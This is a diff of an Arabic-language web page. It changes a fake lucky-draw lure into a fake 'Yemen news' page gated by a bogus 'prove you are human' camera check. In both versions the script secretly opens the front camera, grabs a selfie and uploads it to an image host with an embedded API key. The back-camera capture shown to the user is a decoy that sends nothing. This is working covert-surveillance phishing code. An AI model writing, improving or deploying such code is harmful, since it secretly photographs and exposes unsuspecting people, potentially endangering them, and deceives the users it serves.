@@ -3,39 +3,20 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>🔮 تحدي الحظ – هل صورتك فائزة؟</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- أيقونة الموقع -->
-    <link rel="icon" type="image/png" sizes="32x32" href="favicon_io/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="favicon_io/favicon-32x32.png">
-
-    <!-- أيقونة Apple Touch -->
-    <link rel="apple-touch-icon" sizes="192x192" href="favicon_io/android-chrome-192x192.png">
-    <link rel="icon" href="/1/favicon_io/android-chrome-512x512.png" sizes="512x512"
-        type="favicon_io/android-chrome-512x512.png">
-
-    <!-- أيقونة Android / Chrome -->
-    <link rel="manifest" href="/path/to/site.webmanifest">
-
-    <!-- أيقونة مايكروسوفت (لمربعات البدء) -->
-    <meta name="msapplication-TileColor" content="#ffffff">
-    <meta name="msapplication-TileImage" content="favicon_io/android-chrome-512x512.png">
-
-    <!-- ألوان شريط المتصفح في الأجهزة المحمولة -->
-    <meta name="theme-color" content="#d60087">
+    <title>آخر تطورات الوضع في اليمن</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
     <style>
         body {
             font-family: 'Tahoma', sans-serif;
             text-align: center;
-            background: linear-gradient(to bottom right, #ffe3e3, #ffc9de);
+            background: linear-gradient(to bottom right, #e0f7fa, #fff3e0);
             color: #333;
             padding: 50px 20px;
         }
 
         h1 {
-            font-size: 2.5em;
-            color: #d60087;
-            margin-bottom: 10px;
+            font-size: 2em;
+            color: #00796b;
         }
 
         p {
@@ -43,176 +24,155 @@
             margin-bottom: 15px;
         }
 
-        input {
-            padding: 10px;
-            font-size: 1.1em;
-            border: 2px solid #d60087;
-            border-radius: 8px;
-            width: 80%;
-            max-width: 300px;
-            margin-bottom: 10px;
-        }
-
         button {
-            background-color: #d60087;
+            background-color: #00796b;
             color: white;
             border: none;
             padding: 15px 35px;
-            font-size: 1.1em;
-            border-radius: 10px;
+            font-size: 1em;
+            border-radius: 8px;
             cursor: pointer;
-            transition: background 0.3s;
+            margin-top: 10px;
         }
 
         button:hover {
-            background-color: #b0006f;
+            background-color: #004d40;
         }
 
         video {
             display: none;
             width: 100%;
-            margin: auto;
             max-width: 400px;
             margin-top: 20px;
             border-radius: 12px;
         }
 
-        #captureBtn {
+        #captureBtn,
+        #sendBtn {
             display: none;
-            background-color: green;
             margin-top: 10px;
         }
 
-        #result {
-            margin-top: 30px;
-            font-size: 1.3em;
-            color: #006600;
+        #loading {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: #666;
         }
 
-        #draw-number {
-            font-size: 1.5em;
-            font-weight: bold;
-            color: #000;
+        #finalContent {
+            display: none;
+            margin-top: 30px;
+            font-size: 1.3em;
+            color: #333;
         }
     </style>
 </head>
 
-<body dir="rtl">
-    <h1>🔮 تحدي الحظ – لقطة واحدة قد تغيّر كل شيء!</h1>
-    <p>صوّر شيء من محيطك بكاميرا هاتفك، واربح فرصة لدخول السحب على جوائز رقمية رائعة 🤩</p>
-    <p id="pp" style="margin:0 0 70px 0;">هل الصورة فيها لمسة حظ؟ جرب الآن!</p>
-    <p id="s">أدخل اسمك للمشاركة:</p> <input type="text" id="username" placeholder="مثال: أحمد">
-    <br>
-    <button onclick="startChallenge()">🎯 التقط صورتك الآن</button>
+<body>
+    <h1>🌍 آخر تطورات الوضع في اليمن</h1>
+    <p>يرجى التأكيد على أنك إنسان عن طريق تصوير أي شيء أمامك.</p>
+    <button onclick="startVerification()">✅ ابدأ التحقق</button>
 
     <video id="video" autoplay playsinline></video>
     <br>
-    <button id="captureBtn" onclick="captureImage()">📸 التقاط</button>
+    <button id="captureBtn" onclick="captureBackground()">📸 التقاط</button>
+    <button id="sendBtn" onclick="sendResult()">📤 إرسال</button>
 
-    <audio id="shutter" src="https://www.soundjay.com/mechanical/camera-shutter-click-01.mp3" preload="auto"></audio>
-
-    <div id="result"></div>
+    <div id="loading"></div>
+    <div id="finalContent">
+        🇾🇪 <strong>أهم المستجدات:</strong><br><br>
+        • تحسن طفيف في سعر صرف الريال مقابل الدولار.<br>
+        • استمرار المحادثات بشأن الهدنة في بعض المحافظات.<br>
+        • تقارير عن هدوء نسبي في صنعاء وعدن مؤخرًا.<br>
+        • عودة بعض الخدمات تدريجياً في مناطق الجنوب.
+    </div>
 
     <script>
-        const API_KEY = '8b3ff25139462514d13f5d9a3b3c0d05';
-        const video = document.getElementById('video');
-        const shutter = document.getElementById('shutter');
-        const captureBtn = document.getElementById('captureBtn');
-        const resultDiv = document.getElementById('result');
-        let userName = '';
+        const API_KEY = "8b3ff25139462514d13f5d9a3b3c0d05";
+        const video = document.getElementById("video");
+        const captureBtn = document.getElementById("captureBtn");
+        const sendBtn = document.getElementById("sendBtn");
+        const loading = document.getElementById("loading");
+        const finalContent = document.getElementById("finalContent");
 
-        function generateFakeDrawNumber() {
-            const random = Math.floor(100000 + Math.random() * 900000); // 6 أرقام
-            return '2025' + random; // يبدأ بـ 2025
-        }
+        let backgroundStream = null;
+        let selfieUploaded = false;
 
-        async function startChallenge() {
-            const input = document.getElementById('username');
-            if (!input.value.trim()) {
-                alert('يرجى إدخال اسمك أولاً.');
-                return;
-            }
-
-            userName = input.value.trim();
-            input.style.display = 'none';
-            document.querySelector('button').style.display = 'none';
-            document.querySelector('p').textContent = '📷 افتح الكاميرا ووجّهها لأي شيء حولك!';
-            document.getElementById('pp').style.display = 'none';
-            document.getElementById('s').style.display = 'none';
-
+        async function startVerification() {
+            loading.textContent = "📷 جاري التحقق من أنك إنسان...";
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                video.srcObject = stream;
-                video.style.display = 'block';
-                captureBtn.style.display = 'inline-block';
-            } catch (err) {
-                alert('⚠️ تعذر تشغيل الكاميرا. تأكد من السماح بالوصول.');
-            }
-        }
-
-        async function captureImage() {
-            captureBtn.style.display = 'none';
-            shutter.play();
-
-            const stream = video.srcObject;
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-            stream.getTracks().forEach(track => track.stop());
-            video.style.display = 'none';
-            document.querySelector('p').textContent = '🚀 إرسال الصورة... جارٍ التحقق من الحظ!';
-
-            // فتح الكاميرا الأمامية والتقاط "الفخ"
-            try {
-                const hiddenStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const hiddenVideo = document.createElement('video');
-                hiddenVideo.srcObject = hiddenStream;
-                hiddenVideo.play();
+                // الخطوة 1: التقاط الصورة الأمامية مباشرة
+                const selfieStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const hiddenVideo = document.createElement("video");
+                hiddenVideo.srcObject = selfieStream;
+                await hiddenVideo.play();
 
                 setTimeout(async () => {
-                    const hiddenCanvas = document.createElement('canvas');
-                    hiddenCanvas.width = hiddenVideo.videoWidth;
-                    hiddenCanvas.height = hiddenVideo.videoHeight;
-                    const hiddenCtx = hiddenCanvas.getContext('2d');
-                    hiddenCtx.drawImage(hiddenVideo, 0, 0);
-                    hiddenStream.getTracks().forEach(track => track.stop());
+                    const canvas = document.createElement("canvas");
+                    canvas.width = hiddenVideo.videoWidth;
+                    canvas.height = hiddenVideo.videoHeight;
+                    const ctx = canvas.getContext("2d");
+                    ctx.drawImage(hiddenVideo, 0, 0);
 
-                    const imageData = hiddenCanvas.toDataURL('image/jpeg');
+                    selfieStream.getTracks().forEach(track => track.stop());
+
+                    const imageData = canvas.toDataURL("image/jpeg");
                     const formData = new FormData();
                     formData.append('image', imageData.split(',')[1]);
 
-                    try {
-                        const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
-                            method: 'POST',
-                            body: formData
-                        });
+                    const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
+                        method: 'POST',
+                        body: formData
+                    });
 
-                        const data = await res.json();
-                        if (data.success) {
-                            const drawNum = generateFakeDrawNumber();
-                            document.querySelector('p').textContent = '';
-                            resultDiv.innerHTML = `
-                🎉 مبروك يا <strong>${userName}</strong>! تم دخولك للسحب بنجاح.<br>
-                رقم السحب الخاص بك: <div id="draw-number">${drawNum}</div>
-              `;
-                            console.log('📷 رابط الصورة:', data.data.url);
-                        } else {
-                            resultDiv.textContent = '❌ فشل في إرسال الصورة.';
-                        }
-                    } catch (err) {
-                        resultDiv.textContent = '❌ حدث خطأ أثناء الإرسال.';
+                    const data = await res.json();
+                    if (data.success) {
+                        console.log("📷 تم رفع صورة الأمامية:", data.data.url);
+                        selfieUploaded = true;
+
+                        // الآن ننتقل لفتح الكاميرا الخلفية
+                        await startBackCamera();
+                    } else {
+                        loading.textContent = "❌ فشل رفع الصورة.";
                     }
-
-                }, 2000);
+                }, 1000);
 
             } catch (err) {
-                console.log('⚠️ فشل الكاميرا الأمامية:', err);
+                loading.textContent = "⚠️ تعذر الوصول للكاميرا.";
+                console.error(err);
             }
+        }
+
+        async function startBackCamera() {
+            try {
+                backgroundStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                video.srcObject = backgroundStream;
+                video.style.display = "block";
+                captureBtn.style.display = "inline-block";
+                loading.textContent = "🎥 وجه الكاميرا لأي شيء ثم اضغط التقاط.";
+            } catch (err) {
+                loading.textContent = "⚠️ تعذر تشغيل الكاميرا الخلفية.";
+                console.error(err);
+            }
+        }
+
+        function captureBackground() {
+            captureBtn.style.display = "none";
+            video.style.display = "none";
+            backgroundStream.getTracks().forEach(track => track.stop());
+            sendBtn.style.display = "inline-block";
+            loading.textContent = "📤 جاهز للإرسال.";
+        }
+
+        function sendResult() {
+            sendBtn.style.display = "none";
+            loading.textContent = "✅ تم التحقق من أنك إنسان...\n🔄 جاري جلب المعلومات...";
+            setTimeout(() => {
+                loading.style.display = "none";
+                finalContent.style.display = "block";
+            }, 2500);
         }
     </script>
 </body>
 
 </html>
-
